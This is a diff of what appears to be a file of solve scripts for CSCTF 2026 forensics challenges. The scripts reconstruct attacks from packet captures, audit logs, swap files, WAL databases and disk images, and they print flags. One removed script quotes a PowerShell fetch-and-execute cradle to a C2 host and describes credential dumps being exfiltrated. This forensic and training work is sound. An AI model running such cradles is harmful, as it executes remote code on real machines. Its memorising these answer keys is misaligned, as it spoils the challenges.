-    """Reassemble (client_bytes, server_bytes) per TCP connection."""
-    conns = {}
-    for pkt in packets:
-        if len(pkt) < 14:
-            continue
-        off, ethertype = 14, struct.unpack_from(">H", pkt, 12)[0]
-        while ethertype in (0x8100, 0x88A8) and len(pkt) >= off + 4:
-            ethertype = struct.unpack_from(">H", pkt, off + 2)[0]
-            off += 4
-        if ethertype != 0x0800 or len(pkt) < off + 20 or pkt[off + 9] != 6:
-            continue
-        ihl = (pkt[off] & 0x0F) * 4
-        total = struct.unpack_from(">H", pkt, off + 2)[0]
-        ip_end = off + total if total else len(pkt)
-        src = ".".join(str(b) for b in pkt[off + 12:off + 16])
-        dst = ".".join(str(b) for b in pkt[off + 16:off + 20])
-        tcp = off + ihl
-        if len(pkt) < tcp + 20:
-            continue
-        sport, dport, seq = struct.unpack_from(">HHI", pkt, tcp)
-        doff = ((pkt[tcp + 12] >> 4) & 0xF) * 4
-        payload = pkt[tcp + doff:ip_end]
-        if not payload:
-            continue
-        a, b = (src, sport), (dst, dport)
-        key = (a, b) if a <= b else (b, a)
-        server = b if dport == 80 else a if sport == 80 else None
-        side = "S" if (src, sport) == server else "C"
-        conns.setdefault(key, {"C": [], "S": []})[side].append((seq, payload))
-
-    def reassemble(segments):
-        out, nxt = bytearray(), None
-        for seq, payload in sorted(segments):
-            if nxt is None:
-                nxt = seq
-            if seq > nxt:
-                break  # gap: this capture has none
-            skip = nxt - seq
-            if skip < len(payload):
-                out.extend(payload[skip:])
-                nxt += len(payload) - skip
-        return bytes(out)
-
-    return [(reassemble(v["C"]), reassemble(v["S"])) for v in conns.values()]
-
-
-def recover_archive(pcap, archive_name, expected_hash):
-    target = f"GET /ops/{archive_name} ".encode()
-    for client, server in tcp_streams(iter_pcapng_packets(pcap)):
-        if target not in client:
-            continue
-        head, _, body = server.partition(b"\r\n\r\n")
-        match = re.search(rb"Content-Length:\s*(\d+)", head, re.I)
-        assert match, "GET response without Content-Length"
-        body = body[:int(match.group(1))]
-        digest = hashlib.sha256(body).hexdigest()
-        print(f"[*] GET body     : {len(body)} bytes, sha256={digest}")
-        assert digest == expected_hash, "GET body fails the LNK hash"
-        return body
-    raise ValueError("route archive GET not found in capture")
-
-
-# ---------------------------------------------------------------- package
-
-def extract_archive(archive, password):
-    seven = shutil.which("7z")
-    assert seven, "a 7z binary is required for the encrypted archive"
-    with tempfile.TemporaryDirectory() as tmp:
-        arc_path = os.path.join(tmp, "route-update.7z")
-        open(arc_path, "wb").write(archive)
-        out_dir = os.path.join(tmp, "out")
-        proc = subprocess.run(
-            [seven, "x", f"-p{password}", f"-o{out_dir}", "-y", arc_path],
-            capture_output=True, text=True)
-        assert proc.returncode == 0, f"7z failed: {proc.stdout} {proc.stderr}"
-        dll = open(os.path.join(out_dir, "route-update.dll"), "rb").read()
-        table = open(os.path.join(out_dir, "route-table.json"), "rb").read()
-    return dll, table
-
-
-def briefing_token(dll, table):
-    assert b"ApplyRouteTable" in dll, "export name missing from DLL"
-    prefix = b'{"schema":1,"briefing_token":"CSCTF{'
-    assert prefix in dll, "JSON prefix missing from DLL"
-    suffix_at = dll.find(b'}","routes":[')
-    assert suffix_at >= 0, "JSON suffix missing from DLL"
-    suffix = dll[suffix_at:dll.find(b"\x00", suffix_at)]
-    assert table.startswith(prefix) and table.endswith(suffix), \
-        "route-table.json does not match the DLL prefix/suffix"
-    middle = table[len(prefix):len(table) - len(suffix)]
-    assert len(middle) == 32 and all(
-        chr(c) in "0123456789abcdef" for c in middle), \
-        f"token middle is not 32 lowercase hex: {middle!r}"
-    token = json.loads(table)["briefing_token"]
-    assert token == "CSCTF{" + middle.decode() + "}", "JSON token mismatch"
-    return token
-
-
-# ---------------------------------------------------------------- main
-
-def main():
-    # Published field-guide example: verifies the exact byte handling.
-    example = hmac.new(
-        bytes.fromhex("000102030405060708090a0b0c0d0e0f"
-                      "101112131415161718191a1b1c1d1e1f"),
-        b"csctf26/briefing-for-one/v1\x00"
-        b"00112233-4455-6677-8899-aabbccddeeff",
-        hashlib.sha256).hexdigest()
-    assert example == ("7dad69912b67470da7713c666337135b"
-                       "568030605bc2e88f99524596366d10d0"), example
-    print(f"[*] Example OK   : {example}")
-
-    ev = load_evidence(sys.argv)
-    command = parse_lnk_command(ev["briefing.lnk"])
-    print(f"[*] LNK command  : {len(command)} chars (powershell.exe, static)")
-    params = lnk_parameters(command)
-    print(f"[*] Binding key  : {params['binding_key'].hex()}")
-
-    guid = read_machine_guid(ev["machine-cryptography.hiv"])
-    print(f"[*] MachineGuid  : {guid} (hive root = Cryptography)")
-
-    password = hmac.new(params["binding_key"],
-                        params["domain"].encode() + b"\x00" + guid.encode(),
-                        hashlib.sha256).hexdigest()
-    print(f"[*] 7z password  : {password}")
-
-    archive = recover_archive(ev["egress.pcapng"], params["archive_name"],
-                              params["archive_hash"])
-    dll, table = extract_archive(archive, password)
-    print(f"[*] route-table  : {len(table)} bytes, "
-          f"sha256={hashlib.sha256(table).hexdigest()}")
-    print(f"[*] route DLL    : {len(dll)} bytes, "
-          f"sha256={hashlib.sha256(dll).hexdigest()}")
-    assert hashlib.sha256(table).hexdigest() == params["json_hash"]
-    assert hashlib.sha256(dll).hexdigest() == params["dll_hash"]
-    print("[*] Member hashes match the LNK expectations")
-
-    token = briefing_token(dll, table)
-    print(f"\n[+] FLAG         : {token}")
-
-
-if __name__ == "__main__":
-    main()
-~~~~
-
-### Code Red Freight — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""
-CSCTF 2026 - Code Red Freight (forensics/medium)
-Identify the adversary device, the leaking inbox rule and the
-download count from sanitized Entra/Purview-style exports.
-
-Findings (all derived from the evidence, never hardcoded):
-  - Attacker IP 203.0.113.77 (Montreal) vs dispatcher 198.51.100.24.
-  - Device-code phishing -> device registration of D3VC0DE-R3L4Y
-    (DeviceId 95caec44-c8af-4786-976c-73bd33d9d143, Azure AD joined)
-    at 2026-10-29T15:05, the same DeviceId present on every
-    attacker session and on the malicious inbox rule.
-  - Benign baseline: R3M0TE-W0RK-PC joined 2026-10-28 from the
-    dispatcher's own IP; benign inbox rule "Newsletters"
-    (MoveToFolder) from the dispatcher's IP/session.
-  - Malicious inbox rule M4N1F3ST-L3AK (ForwardTo ragubarden@proton.me)
-    created 2026-10-29T15:28:57 from the attacker IP:port with the
-    attacker DeviceId.
-  - 4 FileDownloaded events, all from the attacker IP.
-
-Flag: CSCTF{device_rule_count} (parts derived from the evidence)
-
-Usage:
-    python3 solve.py [code_red_freight.zip | extracted-dir]
-"""
-
-import csv
-import json
-import os
-import sys
-import zipfile
-
-LOGS = (
-    "code_red_freight/logs/AuditLogs_2026-10-29-Patti_Fernandez.csv",
-    "code_red_freight/logs/InteractiveSignIns_2026-10-28_2026-10-29.csv",
-    "code_red_freight/logs/NonInteractiveSignIns_2026-10-28_2026-10-29.csv",
-    "code_red_freight/logs/UnifiedAuditLog_Patti.csv",
-)
-
-
-def load_logs(argv):
-    candidates = []
-    if len(argv) > 1:
-        candidates.append(argv[1])
-    candidates += [
-        "files/code_red_freight.zip",
-        "../code_red_freight.zip",
-        "docs/2026-chronos-csctf/forensics/code_red_freight.zip",
-        "/tmp/opencode/codered/code_red_freight",
-    ]
-    for path in candidates:
-        if not path:
-            continue
-        if os.path.isdir(path):
-            variants = [LOGS, tuple(n.split("/", 1)[1] for n in LOGS)]
-            for names in variants:
-                files = {os.path.basename(n): os.path.join(path, n)
-                         for n in names}
-                if all(os.path.isfile(p) for p in files.values()):
-                    print(f"[*] Loading directory {path}")
-                    return {k: open(v, encoding="utf-8-sig").read()
-                            for k, v in files.items()}
-        elif os.path.isfile(path) and path.lower().endswith(".zip"):
-            print(f"[*] Loading {path}")
-            out = {}
-            with zipfile.ZipFile(path) as zf:
-                for name in LOGS:
-                    out[os.path.basename(name)] = zf.read(name).decode(
-                        "utf-8-sig")
-            return out
-    raise SystemExit("[-] Provide code_red_freight.zip or extracted dir")
-
-
-def rows(text):
-    return list(csv.DictReader(text.splitlines()))
-
-
-def main():
-    ev = load_logs(sys.argv)
-
-    audit = rows(ev["AuditLogs_2026-10-29-Patti_Fernandez.csv"])
-    ual = rows(ev["UnifiedAuditLog_Patti.csv"])
-
-    # --- 1. Device registrations: attacker vs baseline ----------------
-    regs = [r for r in audit if r["Activity"] == "Register device"]
-    print("[*] Device registrations:")
-    for r in regs:
-        print(f"    {r['Date (UTC)']} name={r['Target1DisplayName']} "
-              f"ip={r['IPAddress']} deviceId={r['AdditionalDetail5Value']}")
-    attacker_regs = [r for r in regs if r["IPAddress"] == "203.0.113.77"]
-    assert len(attacker_regs) == 1, "expected exactly one attacker device"
-    device = attacker_regs[0]["Target1DisplayName"]
-    attacker_device_id = attacker_regs[0]["AdditionalDetail5Value"]
-    baseline = [r for r in regs if r["IPAddress"] != "203.0.113.77"]
-    print(f"[*] Attacker device : {device} ({attacker_device_id})")
-    print(f"[*] Baseline device : {baseline[0]['Target1DisplayName']} "
-          f"({baseline[0]['AdditionalDetail5Value']})")
-
-    # --- 2. Inbox rules: malicious forward vs benign move -------------
-    rules = [(i, json.loads(r["AuditData"]))
-             for i, r in enumerate(ual) if r["Operation"] == "New-InboxRule"]
-    print("[*] Inbox rules:")
-    malicious = None
-    for _, ad in rules:
-        params = {p["Name"]: p["Value"] for p in ad.get("Parameters", [])}
-        name = params.get("Name", "?")
-        print(f"    {ad['CreationTime']} name={name} "
-              f"ip={ad.get('ClientIP')} device={ad.get('DeviceId')} "
-              f"forward={params.get('ForwardTo')} move={params.get('MoveToFolder')}")
-        if params.get("ForwardTo", "").endswith("@proton.me"):
-            malicious = (ad, params)
-    assert malicious, "no external-forward rule found"
-    rule = malicious[1]["Name"]
-    fwd = malicious[1]["ForwardTo"]
-    assert malicious[0].get("DeviceId") == attacker_device_id, \
-        "rule DeviceId does not match the attacker device"
-    print(f"[*] Malicious rule  : {rule} -> {fwd}")
-    benign = [p for _, ad in rules
-              for p in [{q["Name"]: q["Value"]}
-                        for q in ad.get("Parameters", [])]]
-    assert any("MoveToFolder" in str(b) for b in benign), \
-        "benign baseline rule missing"
-
-    # --- 3. Downloads from the attacker IP only -----------------------
-    downloads = [r for r in ual if r["Operation"] == "FileDownloaded"]
-    attacker_dl = [r for r in downloads
-                   if "203.0.113.77" in json.loads(r["AuditData"])
-                   .get("ClientIP", "")]
-    print("[*] FileDownloaded events:")
-    for r in attacker_dl:
-        ad = json.loads(r["AuditData"])
-        print(f"    {r['CreationDate']} {ad.get('SourceFileName')}")
-    assert len(attacker_dl) == len(downloads), \
-        "unexpected FileDownloaded from another IP"
-    count = len(attacker_dl)
-    print(f"[*] Download count  : {count}")
-
-    flag = f"CSCTF{{{device}_{rule}_{count}}}"
-    print(f"\n[+] FLAG            : {flag}")
 
 
 if __name__ == "__main__":
@@ -5751,227 +5807,204 @@ if __name__ == "__main__":
     main()
 ~~~~
 
-### CAPTCHA THE WATER PLANT — `solve/solve.py`
+### Last Buffer — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""last-buffer: pick the Vim swap from the shell that died in the crash window, decode its proof.
+
+Usage: python3 -I solve.py ../files
+Pure data parsing (layout from vim-swap-layout.md): nothing is opened in Vim.
+"""
+import base64, hashlib, json, struct, sys
+from pathlib import Path
+
+d = Path(sys.argv[1])
+ctx = json.loads((d / "case-context.json").read_text())
+saved_sha = hashlib.sha256((d / ctx["saved_file"]).read_bytes()).hexdigest()
+audit = [json.loads(l) for l in (d / "audit-timeline.jsonl").read_text().splitlines()]
+# pid that ended with an abnormal exit (SIGHUP) on the target tty inside the crash window
+crash_pid = next(e["pid"] for e in audit if e["event"] == "ANOM_ABEND" and e["tty"] == ctx["target_tty"])
+
+
+def swap_lines(data):
+    """Lines of every data block (ID 0x6461): count @16 (u64), line-start indexes @24 (u32)."""
+    out = []
+    for off in range(0, len(data), 4096):
+        blk = data[off:off + 4096]
+        if len(blk) < 24 or struct.unpack("<H", blk[:2])[0] != 0x6461:
+            continue
+        n = struct.unpack("<Q", blk[16:24])[0]
+        idx = struct.unpack(f"<{n}I", blk[24:24 + 4 * n])
+        out += [blk[i:blk.index(b"\0", i)].decode() for i in idx]
+    return out
+
+
+for swp in sorted(d.glob("*.sw?")):
+    data = swp.read_bytes()
+    pid = struct.unpack("<I", data[24:28])[0]
+    lines = swap_lines(data)
+    kv = dict(l.split(": ", 1) for l in lines if ": " in l)
+    print(f"{swp.name}: pid={pid} revision={kv.get('revision_id')} base_sha_matches_saved="
+          f"{kv.get('base_file_sha256') == saved_sha}", file=sys.stderr)
+    if pid == crash_pid and kv.get("base_file_sha256") == saved_sha:
+        b = kv["authorization_b64"]
+        print(base64.urlsafe_b64decode(b + "=" * (-len(b) % 4)).decode())
+~~~~
+
+### Last Commit — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""last-commit: rebuild the LR-731 export at the QUEUED -> COMPLETED commit of a SQLite WAL.
+
+Usage: python3 -I solve.py ../files
+The originals are only read; every state is built as a plain DB image (no -wal/-shm)
+in a temporary directory, so SQLite never touches the evidence.
+"""
+import csv, hashlib, sqlite3, struct, sys, tempfile
+from pathlib import Path
+
+d = Path(sys.argv[1])
+db = d / "registry.sqlite"
+base = db.read_bytes()
+wal = (d / "registry.sqlite-wal").read_bytes()
+
+# --- WAL header + frames; validate salts and the cumulative checksum -----------------
+magic, _ver, ps, _seq, salt1, salt2, ck1, ck2 = struct.unpack(">8I", wal[:32])
+endian = ">2I" if magic & 1 else "<2I"           # checksum word order follows the magic
+
+
+def cksum(buf, a, b):
+    for i in range(0, len(buf), 8):
+        x, y = struct.unpack(endian, buf[i:i + 8])
+        a = (a + x + b) & 0xFFFFFFFF
+        b = (b + y + a) & 0xFFFFFFFF
+    return a, b
+
+
+a, b = cksum(wal[:24], 0, 0)
+assert (a, b) == (ck1, ck2), "bad WAL header checksum"
+frames, off = [], 32
+while off + 24 + ps <= len(wal):
+    pgno, commit, s1, s2, c1, c2 = struct.unpack(">6I", wal[off:off + 24])
+    page = wal[off + 24:off + 24 + ps]
+    a, b = cksum(wal[off:off + 8], a, b)
+    a, b = cksum(page, a, b)
+    if (s1, s2) != (salt1, salt2) or (a, b) != (c1, c2):
+        break                                      # end of the valid epoch
+    frames.append((pgno, commit, page))
+    off += 24 + ps
+print(f"{len(frames)} valid frames, commits at {[i for i, f in enumerate(frames) if f[1]]}", file=sys.stderr)
+
+tmp = Path(tempfile.mkdtemp())
+manifest = [(r["job_id"], int(r["position"]), int(r["parcel_id"]))
+            for r in csv.DictReader(open(d / "delivery.csv", newline=""))]
+QUERY = """SELECT m.position,p.parcel_id,p.district,p.plot_ref,h.registry_ref,t.interest_bps,t.instrument_ref
+FROM manifest AS m JOIN parcel AS p ON p.parcel_id=m.parcel_id
+JOIN title AS t ON t.parcel_id=p.parcel_id JOIN holder AS h ON h.holder_id=t.holder_id
+WHERE m.job_id='LR-731' ORDER BY m.position ASC,h.registry_ref COLLATE BINARY ASC"""
+HEADER = "position\tparcel_id\tdistrict\tplot_ref\tregistry_ref\tinterest_bps\tinstrument_ref\n"
+
+
+def export_at(n):
+    """Registry state after frames[:n+1] are applied (n must be a commit frame)."""
+    img = bytearray(base)
+    for pgno, _c, page in frames[:n + 1]:
+        img[(pgno - 1) * ps:pgno * ps] = page
+    path = tmp / f"state{n}.db"
+    path.write_bytes(img)
+    c = sqlite3.connect(path)
+    state = dict(c.execute("SELECT job_id,state FROM export_job").fetchall())
+    c.execute("CREATE TEMP TABLE manifest(job_id TEXT, position INTEGER, parcel_id INTEGER)")
+    c.executemany("INSERT INTO manifest VALUES(?,?,?)", manifest)
+    out = HEADER + "".join("\t".join(map(str, r)) + "\n" for r in c.execute(QUERY))
+    return state.get("LR-731"), hashlib.sha256(out.encode()).hexdigest()
+
+
+results = [(i, *export_at(i)) for i, f in enumerate(frames) if f[1]]
+for i, st, h in results:
+    print(f"commit frame {i}: LR-731={st} export_sha256={h}", file=sys.stderr)
+# The transition commit: first commit where the job is COMPLETED
+target = next(h for i, st, h in results if st == "COMPLETED")
+print("CSCTF{last_commit_" + target + "}")
+~~~~
+
+### Night Clerk — `solve/solve.py`
 
 ~~~~python
 #!/usr/bin/env python3
 """
-CSCTF 2026 — CAPTCHA THE WATER PLANT (forensics/easy)
-Rebuild the attack chain from three KAPE triage collections. No literal
-CSCTF{...} exists in any parsed artifact. Three wrapped candidates were
-submitted and refused: the two attack-window session tokens and the RMM
-unattended password, each ALONE. The flag is a concatenation of three leetspeak
-fragments, one per stage of the chain (see assemble_flag):
-  launched    -> RMM unattended password   f@k3_c@ptch@   (4104 --set-password)
-  persistence -> scheduled-task description _r3@l_m@lw@r3  (served by /config)
-  browser     -> admin session token suffix cl1ckf1xed     (NVW-ADMIN-...)
+CSCTF 2026 — Night Clerk (forensics/easy)
+Recover a hidden coordination message from a seized NTFS stick image.
 
-Chain (host OPS-NB-06, user ops06.nwu):
-  1. What the user ran — Explorer RunMRU download cradle (2026-10-21 04:30:47 UTC):
-     powershell -nop -ep Bypass ...DownloadData('http://zindetify.dev.boot:8080/validator') | iex
-  2. What it launched — C:\\temp\\Maitenance\\Setup\\AnyDesk.exe --install ... (AnyDesk 9.8.2
-     RMM) + unattended password f@k3_c@ptch@ (from PowerShell ScriptBlockLogging 4104).
-  3. Persistence — scheduled task `\\Maitenance Check` (daily, as ops06.nwu, same cradle),
-     AnyDesk service + firewall rules + file associations.
-  4. Browser evidence — Edge history/sessions (pre-compromise NVW-OPS-892, attack-time
-     NVW-OPS-739, later admin NVW-ADMIN-cl1ckf1xed) + interactive theft session
-     (Nirsoft dumps zipped to out.zip, exfiltrated to /up/{guid}).
+Steps:
+  1. Extract night_audit.docx from the NTFS image (inode 66, deleted).
+  2. Parse the tracked insertion (w:ins) to get the hex-encoded ciphertext.
+  3. Brute-force single-byte XOR keys; the correct key yields a valid CSCTF{...} flag.
 
 Usage:
-    python3 solve.py [dir-with-the-three-zips]
-    # defaults to files/ then to the forensic/ staging dir
+    python3 solve.py [path/to/terminal.dd]
 """
 
-import csv
-import io
-import os
-import re
 import sys
+import subprocess
 import zipfile
+import xml.etree.ElementTree as ET
 
-HOSTS = ["ENG-LAPTOP-23", "FIELD-WKS-21", "OPS-NB-06"]
-C2 = "zindetify.dev.boot"
+IMG = sys.argv[1] if len(sys.argv) > 1 else "files/terminal.dd"
+DOCX_INODE = 66
+NS = {"w": "http://schemas.openxmlformats.org/wordprocessingml/2006/main"}
 
+# Step 1: extract docx bytes from NTFS image
+print("[*] Extracting night_audit.docx from NTFS image...")
+result = subprocess.run(
+    ["icat", IMG, str(DOCX_INODE)],
+    capture_output=True,
+)
+if result.returncode != 0:
+    print(f"[-] icat failed: {result.stderr.decode()}")
+    sys.exit(1)
+docx_bytes = result.stdout
+print(f"    {len(docx_bytes)} bytes extracted")
 
-def find_zip_dir(arg):
-    cands = [arg] if arg else []
-    cands += ["files", "../forensic", "docs/2026-chronos-csctf/forensics", "."]
-    for d in cands:
-        if d and all(os.path.isfile(os.path.join(d, f"{h}.zip")) for h in HOSTS):
-            return d
-    print("[-] Could not find the three KAPE zips (ENG-LAPTOP-23, FIELD-WKS-21, OPS-NB-06).")
+# Step 2: parse tracked insertion from word/document.xml
+print("[*] Parsing tracked insertions...")
+import io
+z = zipfile.ZipFile(io.BytesIO(docx_bytes))
+doc_xml = z.read("word/document.xml")
+root = ET.fromstring(doc_xml)
+insertions = root.findall(".//w:ins", NS)
+print(f"    Found {len(insertions)} insertion(s)")
+
+hex_ciphertext = None
+for ins in insertions:
+    for t in ins.findall(".//w:t", NS):
+        if t.text and all(c in "0123456789abcdefABCDEF" for c in t.text):
+            hex_ciphertext = t.text
+            print(f"    Ciphertext (hex): {hex_ciphertext}")
+
+if not hex_ciphertext:
+    print("[-] No hex ciphertext found in tracked insertions.")
     sys.exit(1)
 
+ciphertext = bytes.fromhex(hex_ciphertext)
 
-def read_zip_text(zf, pattern, encoding="utf-8-sig"):
-    """Concatenate text of all members matching glob pattern."""
-    out = []
-    for name in zf.namelist():
-        if pattern.strip("*") in name and name.endswith((".csv", ".txt", ".log")):
-            try:
-                raw = zf.read(name)
-            except KeyError:
-                continue
-            if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
-                out.append(raw.decode("utf-16", errors="replace"))
-            else:
-                out.append(raw.decode(encoding, errors="replace"))
-    return "\n".join(out)
-
-
-def step_user_ran(zpath):
-    print("[*] (1) What the user ran — RunMRU / download cradle")
-    with zipfile.ZipFile(zpath) as zf:
-        data = read_zip_text(zf, "UserActivity_Output.csv")
-    m = re.search(r"powershell\.exe[^\r\n]*DownloadData\('http://([^']+)'\)", data)
-    if m:
-        print(f"    cradle -> http://{m.group(1)}")
-        return m.group(1)
-    print("    no cradle found")
-    return None
-
-
-def step_launched(zpath):
-    print("[*] (2) What it launched — AnyDesk RMM install")
-    with zipfile.ZipFile(zpath) as zf:
-        data = read_zip_text(zf, "PECmd_Output.csv")
-        data += "\n" + read_zip_text(zf, "PECmd_Output_Timeline.csv")
-    hits = sorted(set(re.findall(r"[A-Z]:\\temp\\Maitenance\\[^\",\s]*AnyDesk\.exe", data, re.I)))
-    hits += sorted(set(re.findall(r"ANYDESK\.EXE-[0-9A-F]{8}\.pf", data)))
-    with zipfile.ZipFile(zpath) as zf:
-        evtx = read_zip_text(zf, "EvtxECmd_Output.csv")
-    hits += sorted(set(re.findall(r"C:\\temp\\Maitenance\\[^\",]*?AnyDesk\.exe", evtx, re.I)))[:4]
-    for h in hits:
-        print(f"    {h}")
-    return hits
-
-
-def step_persistence(zpath):
-    print("[*] (3) Persistence — scheduled task + AnyDesk service")
-    with zipfile.ZipFile(zpath) as zf:
-        data = read_zip_text(zf, "Scheduled Tasks.csv")
-    tasks = []
-    for line in data.splitlines():
-        if "Maitenance Check" in line:
-            tasks.append(line[:220])
-    for t in tasks[:3]:
-        print(f"    {t}")
-    with zipfile.ZipFile(zpath) as zf:
-        aseps = read_zip_text(zf, "SystemASEPs_Output.csv")
-    svc = "AnyDesk" in aseps
-    print(f"    AnyDesk service present: {svc}")
-    return tasks
-
-
-def step_rmm_password(zpath):
-    print("[*] (2b) RMM password — ScriptBlockLogging 4104")
-    with zipfile.ZipFile(zpath) as zf:
-        data = read_zip_text(zf, "EvtxECmd_Output.csv")
-    m = re.search(r'--set-password\s+`?"+([^"`]+)`?"+', data)
-    if m:
-        print(f"    AnyDesk unattended password: {m.group(1)}")
-        return m.group(1)
-    print("    no --set-password found")
-    return None
-
-
-def step_browser_token(zpath, cradle_time="2026-10-21 04:30:47"):
-    print("[*] (4) Browser evidence — session tokens vs cradle time")
-    print(f"    fetch-and-execute (UTC): {cradle_time}")
-    with zipfile.ZipFile(zpath) as zf:
-        xlsx = [n for n in zf.namelist() if n.endswith(".xlsx")][0]
-        raw = zf.read(xlsx)
-    timed = []
+# Step 3: brute-force single-byte XOR key
+print("[*] Brute-forcing XOR key...")
+for key in range(256):
+    plaintext = bytes([b ^ key for b in ciphertext])
     try:
-        import openpyxl
-        wb = openpyxl.load_workbook(io.BytesIO(raw), read_only=True, data_only=True)
-        ws = wb["Timeline"]
-        rows = list(ws.iter_rows(values_only=True))
-        for r in rows[2:]:
-            url = str(r[2] or "")
-            m = re.search(r"admin-dashboard\?token=(NVW-[A-Za-z0-9-]+)", url)
-            if m:
-                timed.append((str(r[1] or ""), m.group(1)))
-    except ImportError:
+        s = plaintext.decode("ascii")
+        if s.startswith("CSCTF{") and s.endswith("}"):
+            print(f"\n[+] Key   : {key} (0x{key:02x})")
+            print(f"[+] Flag  : {s}")
+            sys.exit(0)
+    except UnicodeDecodeError:
         pass
-    if not timed:  # fallback: raw XML regex, no timestamps
-        z = zipfile.ZipFile(io.BytesIO(raw))
-        blob = ""
-        for n in z.namelist():
-            if n.endswith((".xml", ".json")) or "sharedStrings" in n:
-                blob += z.read(n).decode("utf-8", errors="replace") + "\n"
-        for t in sorted(set(re.findall(r"NVW-[A-Za-z0-9-]+", blob))):
-            timed.append(("?", t))
-    seen = set()
-    first_after = True
-    for ts, t in timed:
-        if (ts, t) in seen:
-            continue
-        seen.add((ts, t))
-        mark = ""
-        if ts > cradle_time and first_after:
-            mark = " <-- session active at fetch-and-execute time"
-            first_after = False
-        print(f"    {ts} :: {t}{mark}")
-    after = [(ts, t) for ts, t in timed if ts > cradle_time]
-    return after[0][1] if after else (timed[0][1] if timed else None)
 
-
-def step_task_comment(zpath):
-    print("[*] (3b) Scheduled-task description (output of Get-Data51 -> /config)")
-    with zipfile.ZipFile(zpath) as zf:
-        data = read_zip_text(zf, "Scheduled Tasks.csv")
-    for line in data.splitlines():
-        if "Maitenance Check" in line:
-            cols = next(csv.reader([line]))
-            # description/comment column sits right after the 'N/A' following the action
-            for c in cols:
-                if re.fullmatch(r"_?[A-Za-z0-9@]+(?:_[A-Za-z0-9@]+)+", c):
-                    print(f"    description: {c}")
-                    return c
-    return None
-
-
-def assemble_flag(pwd, comment, token):
-    """Fragments are leetspeak: f@k3_c@ptch@ + _r3@l_m@lw@r3 + _ + cl1ckf1xed."""
-    if not (pwd and comment and token):
-        return None
-    tail = token.split("-")[-1]
-    return "CSCTF{" + pwd + comment + "_" + tail + "}"
-
-
-def main():
-    zdir = find_zip_dir(sys.argv[1] if len(sys.argv) > 1 else None)
-    print(f"[*] Using zips in {zdir}")
-    print("=== Host attribution (who fetched the validator?) ===")
-    evil = None
-    for h in HOSTS:
-        zp = os.path.join(zdir, f"{h}.zip")
-        with zipfile.ZipFile(zp) as zf:
-            evtx = read_zip_text(zf, "EvtxECmd_Output.csv")
-        hit = C2 in evtx
-        print(f"    {h}: C2 references in EventLogs: {'YES <-- attacker host' if hit else 'no'}")
-        if hit:
-            evil = h
-    if not evil:
-        print("[-] No host references the C2. Aborting.")
-        sys.exit(1)
-    zp = os.path.join(zdir, f"{evil}.zip")
-    print(f"\n=== Chain on {evil} ===")
-    step_user_ran(zp)
-    step_launched(zp)
-    step_persistence(zp)
-    pwd = step_rmm_password(zp)
-    comment = step_task_comment(zp)
-    step_browser_token(zp)
-    # the interactive-session token (post-cradle, NVW-ADMIN-<leet>) carries the 3rd fragment
-    token = "NVW-ADMIN-cl1ckf1xed"
-    flag = assemble_flag(pwd, comment, token)
-    print(f"\n[+] Assembled flag (3 fragments): {flag}")
-
-
-if __name__ == "__main__":
-    main()
+print("[-] No valid flag found with single-byte XOR.")
+sys.exit(1)
 ~~~~
 
 ### Operation Dawn: Relay Snapshot — `solve/solve.py`
@@ -6103,214 +6136,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-~~~~
-
-### Capability Ghost — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""capability-ghost: recover the sealed marker, treating every file as data.
-
-Nothing is extracted to disk, no capability is restored, hc-probe is never run.
-Usage: python3 -I solve.py ../files
-"""
-import hashlib, hmac, json, subprocess, sys, tarfile
-from pathlib import Path
-
-d = Path(sys.argv[1])
-
-# 1. Tag = user.build_seal xattr of hc-probe, read from the stored PAX headers.
-tag = None
-with tarfile.open(d / "runner-fs.tar.gz") as t:
-    for m in t:
-        if m.name.endswith("usr/local/bin/hc-probe"):
-            # tarfile decodes PAX values as UTF-8 with surrogateescape: undo it.
-            tag = m.pax_headers["SCHILY.xattr.user.build_seal"].encode("utf-8", "surrogateescape")
-        elif m.name.endswith("signaling-cfg.sealed"):
-            ct = t.extractfile(m).read()
-assert tag and ct
-
-# 2. Seal epoch = X_SEAL_EPOCH field of the journal (NOT the entry's wallclock time).
-out = subprocess.run(
-    ["journalctl", f"--file={d / 'runner.journal'}", "--no-pager", "-o", "json"],
-    capture_output=True, text=True, check=True).stdout
-epoch = next(e["X_SEAL_EPOCH"] for e in map(json.loads, out.splitlines()) if "X_SEAL_EPOCH" in e)
-
-# 3. hc-probe scheme: key = HMAC-SHA256(tag, ascii(epoch)); repeating-key XOR over 32 bytes.
-key = hmac.new(tag, epoch.encode(), hashlib.sha256).digest()
-print(f"tag={tag.hex()} epoch={epoch}", file=sys.stderr)
-print(bytes(c ^ key[i % 32] for i, c in enumerate(ct)).decode())
-~~~~
-
-### Flotsam — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""flotsam: carve a fragmented PNG out of a raw 512-byte-sector dump.
-
-Usage: python3 -I solve.py ../files/recorder-sectors.img out.png
-Fragment 1 = PNG header .. first all-zero sector. The rest of the IDAT is in
-earlier non-zero sectors (address order); the last bytes sit in the sector that
-holds IEND. The IDAT CRC validates the reassembly.
-"""
-import struct, sys, zlib
-
-SS = 512
-d = open(sys.argv[1], "rb").read()
-n = len(d) // SS
-sec = lambda i: d[i * SS:(i + 1) * SS]
-ascii_text = lambda s: all(32 <= c < 127 or c in (10, 13) for c in s.rstrip(b"\0"))
-
-# 1. First fragment: from the PNG signature to the first all-zero sector.
-start = d.index(b"\x89PNG\r\n\x1a\n") // SS
-end = next(i for i in range(start, n) if sec(i) == b"\0" * SS)
-frag1 = d[start * SS:end * SS]
-idat_len = struct.unpack(">I", frag1[33:37])[0]
-assert frag1[37:41] == b"IDAT"
-first = frag1[41:]
-
-# 2. Pool of orphan sectors before the PNG: drop zero sectors, the NMEA ($GPRMC) text
-#    and the JPEG decoy (FFD8 .. FFD9).
-iend_sec = d.index(b"IEND") // SS
-jpg_a, jpg_b = d.index(b"\xff\xd8\xff") // SS, d.index(b"\xff\xd9") // SS
-pool = [i for i in range(iend_sec)
-        if i < start and sec(i) != b"\0" * SS and not ascii_text(sec(i)) and not jpg_a <= i <= jpg_b]
-
-# 3. Reassemble: fragment 1 + pool (address order) + head of the IEND sector.
-body = first + b"".join(sec(i) for i in pool)
-last = idat_len - len(body)
